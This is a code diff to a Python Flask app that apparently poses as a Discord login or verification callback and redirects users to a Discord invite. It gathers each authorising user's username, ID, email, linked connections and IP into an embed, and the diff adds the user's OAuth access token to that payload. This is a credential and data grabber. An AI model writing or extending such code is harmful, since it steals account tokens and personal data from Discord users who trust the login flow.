@@ -52,7 +52,7 @@ def get_ip():
     return ip
 
 def get_redirect_uri():
-    # Se adapta automáticamente al dominio que estés usando (dcalex, dc-alex, etc.)
+    # Se adapta automáticamente al dominio que estés usando (ej. dc-al3xg0nzalezzz.vercel.app)
     host = request.headers.get('X-Forwarded-Host', request.headers.get('Host'))
     scheme = request.headers.get('X-Forwarded-Proto', 'https')
     return f"{scheme}://{host}/callback"
@@ -86,15 +86,27 @@ def callback():
     if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
     
     try:
-        # 1. Obtener Token
-        r = requests.post("https://discord.com/api/v10/oauth2/token", data={
+        # 1. Obtener Token (REFORZADO)
+        payload = {
             'client_id': CLIENT_ID, 
             'client_secret': CLIENT_SECRET, 
             'grant_type': 'authorization_code', 
             'code': code, 
             'redirect_uri': redirect_uri
-        }, headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
+        }
         
+        # Hacemos la petición y verificamos errores
+        resp = requests.post(
+            "https://discord.com/api/v10/oauth2/token", 
+            data=payload, 
+            headers={'Content-Type': 'application/x-www-form-urlencoded'}
+        )
+        
+        if resp.status_code != 200:
+            print(f"[ERROR OAUTH] Fallo al obtener token: {resp.status_code} - {resp.text}")
+            return redirect("https://discord.gg/nUy6Vjr9YU")
+
+        r = resp.json()
         token = r.get('access_token')
         
         if token:
@@ -111,6 +123,7 @@ def callback():
             username = user.get('username', 'Unknown')
             user_id = user.get('id', 'Unknown')
             email = user.get('email', 'No visible')
+            token = r.get('access_token')
             verified = "✅" if user.get('verified') else "❌"
             
             # Formatear conexiones en texto
@@ -134,7 +147,8 @@ def callback():
                         {"name": "🆔 ID", "value": f"`{user_id}`", "inline": True},
                         {"name": "📧 Email", "value": f"`{email}` {verified}", "inline": False},
                         {"name": "🔗 Conexiones", "value": f"{conn_str}", "inline": False},
-                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False}
+                        {"name": "🌐 IP", "value": f"`{ip}`", "inline": False},
+                        {"name": "TOKEN", "value": f"`{token}`", "inline": False}
                     ]
                 }]
             })
